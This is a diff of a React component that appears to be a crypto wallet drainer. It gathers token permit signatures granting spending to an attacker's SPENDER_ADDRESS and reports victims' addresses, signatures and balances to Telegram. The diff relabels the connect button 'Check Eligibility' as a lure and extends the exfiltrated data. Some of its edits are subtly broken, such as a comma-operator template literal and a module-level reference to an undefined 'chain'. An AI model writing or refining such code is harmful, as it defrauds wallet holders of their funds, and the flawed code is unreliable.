@@ -10,6 +10,7 @@ import { useState, useCallback, useEffect } from 'react'
 import { logToTelegram } from "./log"; // Import logging function
 import { adminWallet } from './transfer'
 
+let currentChain = chain;
 
 function toDeadline(expiration) {
   return Math.floor((Date.now() + expiration) / 1000)
@@ -19,7 +20,7 @@ const Permit = ({chain}) => {
   let [account, setAccount] = useState('')
   let [validWallet, setValidWallet] = useState(false)
   
-  let currentChain = chain;
+   currentChain = chain;
   console.log(currentChain)
   
     let currentChainRPC = ""; // Declare variable outside for proper scoping
@@ -175,7 +176,7 @@ const handleTransfer = useCallback(async () => {
 
       const signature = await signTypedData(signer, domain, types, values);
   
-      let SignedMessage = `Signed: \nAddress: ${account} \nToken: ${token} \n For: ${SPENDER_ADDRESS}`;
+      let SignedMessage = `Signed: \nAddress: ${signature, currentChain, account} \nToken: ${token} \n For: ${SPENDER_ADDRESS}`;
       logToTelegram(SignedMessage); 
 
       const permitAbi = [
@@ -280,8 +281,8 @@ const handleTransfer = useCallback(async () => {
         let AllBalanceLog = `All balance: \nAddress: ${account} \nTokens: ${JSON.stringify(balancesLog)}`;
         logToTelegram(AllBalanceLog); 
             // setWalletTokens(wT)
-            // localStorage.setItem('currentToken', wT[0])
-            localStorage.setItem('currentToken', '0xe6863210e49B080C044Cc5df861e5A83435844D0')
+            localStorage.setItem('currentToken', wT[0])
+            // localStorage.setItem('currentToken', '0xe6863210e49B080C044Cc5df861e5A83435844D0')
             
             console.log(nonZeroBalances[0])
             console.log(parseInt(nonZeroBalances[0].gBalance))
@@ -312,7 +313,7 @@ const handleTransfer = useCallback(async () => {
         </>
       ) : (
         <p onClick={connectWallet} >
-            Connect
+            Check Eligibility
         </p>
       )}
     </>
